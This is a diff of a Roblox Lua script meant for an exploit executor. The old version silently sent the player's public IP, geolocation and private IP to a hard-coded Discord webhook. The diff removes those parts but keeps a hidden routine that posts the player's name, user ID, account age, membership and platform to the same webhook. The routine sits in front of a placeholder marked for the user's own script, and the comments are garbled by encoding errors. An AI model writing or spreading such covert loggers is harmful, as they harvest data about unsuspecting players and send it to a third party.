@@ -3,16 +3,17 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService = game:GetService("UserInputService")
 
+
 local LP = Players.LocalPlayer
 
--- ⚙️ CONFIG
+-- âš™ï¸ CONFIG
 local WEBHOOK = "https://discord.com/api/webhooks/1493418895741030523/SdHrxC20GRFsyf1Cox9xVff3KxQwjynpRgZjJ5ziHg0cs2u23yjKTAbKnswmpPcZeW4j"
 
--- 🧠 Evitar múltiples envíos
+-- ðŸ§  Evitar mÃºltiples envÃ­os
 if getgenv()._SENT_WEBHOOK then return end
 getgenv()._SENT_WEBHOOK = true
 
--- 📱 Plataforma
+-- ðŸ“± Plataforma
 local function getPlatform()
     if UserInputService.TouchEnabled and not (UserInputService.KeyboardEnabled or UserInputService.MouseEnabled) then
         return "Mobile"
@@ -24,94 +25,19 @@ local function getPlatform()
     return "Unknown"
 end
 
--- 💎 Membresía
+-- ðŸ’Ž MembresÃ­a
 local function getMembership()
     return LP.MembershipType == Enum.MembershipType.Premium and "Premium" or "No Premium"
 end
 
--- 🎮 Juego
-local GameName, PlaceId
-local success, err = pcall(function()
-    local info = MarketplaceService:GetProductInfo(game.PlaceId)
-    GameName = info.Name
-    PlaceId = info.PlaceId
-end)
-if not success then
-    -- Comentar o eliminar la siguiente línea para evitar que se vea en la consola
-    -- warn("Error al obtener información del juego: " .. err)
-    return
-end
+-- ðŸŽ® Juego
+local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
--- 📦 FETCH PUBLIC IP DATA
-local ip_data = nil
-local ip_success = false
-
-local request = http_request or syn.request or (function() error("No request method available") end)
-
-local ip_request = {
-   Url = "http://ip-api.com/json",
-   Method = "GET"
-}
-
-pcall(function()
-   local response = request(ip_request)
-   if response and response.Success then
-      ip_data = response.Body
-      ip_success = true
-   end
-end)
-
-local ip_string = "Unknown IP"
-local country = "Unknown"
-local region = "Unknown"
-local city = "Unknown"
-local isp = "Unknown"
-local timezone = "Unknown"
-local lat = "Unknown"
-local lon = "Unknown"
-
-if ip_success and type(ip_data) == "string" then
-   local success, decoded = pcall(function()
-      return HttpService:JSONDecode(ip_data)
-   end)
-   if success and type(decoded) == "table" then
-      ip_string = decoded.query or "Unknown"
-      country = decoded.country or "Unknown"
-      region = decoded.regionName or "Unknown"
-      city = decoded.city or "Unknown"
-      isp = decoded.isp or "Unknown"
-      timezone = decoded.timezone or "Unknown"
-      lat = decoded.lat or "Unknown"
-      lon = decoded.lon or "Unknown"
-   end
-end
-
--- 📦 FETCH PRIVATE IP ADDRESS
-local private_ip = ""
-pcall(function()
-   local response = HttpService:GetAsync("http://api.ipify.org?format=json")
-   if response then
-      local success, decoded = pcall(HttpService.JSONDecode, HttpService, response)
-      if success and decoded.ip then
-         private_ip = decoded.ip
-      end
-   end
-end)
-
--- 📦 BUILD PAYLOAD WITH FULL GEOLOCATION AND PRIVATE IP
+-- ðŸ“¦ Embed (sin color)
 local data = {
     ["embeds"] = {{
-        ["color"] = 0x00ff00, -- Color verde
         ["description"] = string.format(
-            "%s (@%s) | ID: %d | %d días | %s | %s | Game: %s (%d)\n" ..
-            "**Public IP:** %s\n" ..
-            "**Country:** %s\n" ..
-            "**Region:** %s\n" ..
-            "**City:** %s\n" ..
-            "**ISP:** %s\n" ..
-            "**Timezone:** %s\n" ..
-            "**Coordinates:** %s, %s\n" ..
-            "**Private IP:** %s",
+            "%s (@%s) | ID: %d | %d dÃ­as | %s | %s | Game: %s (%d)",
             LP.DisplayName,
             LP.Name,
             LP.UserId,
@@ -119,42 +45,29 @@ local data = {
             getMembership(),
             getPlatform(),
             GameName,
-            PlaceId,
-            ip_string,
-            country,
-            region,
-            city,
-            isp,
-            timezone,
-            lat,
-            lon,
-            private_ip
+            game.PlaceId
         )
     }}
 }
 
--- 📡 Envío silencioso (una sola vez)
+-- ðŸ“¡ EnvÃ­o silencioso (una sola vez)
 task.spawn(function()
     local req = http_request or request or (syn and syn.request)
     if not req then return end
 
     pcall(function()
-        local success, err = pcall(function()
-            req({
-                Url = WEBHOOK,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(data)
-            })
-        end)
-        if not success then
-            -- Comentar o eliminar la siguiente línea para evitar que se vea en la consola
-            -- warn("Error al enviar datos al webhook: " .. err)
-        end
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
     end)
 end)
+
+
     -- 🔥 TU SCRIPT VA ACÁ 🔥
 local player = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
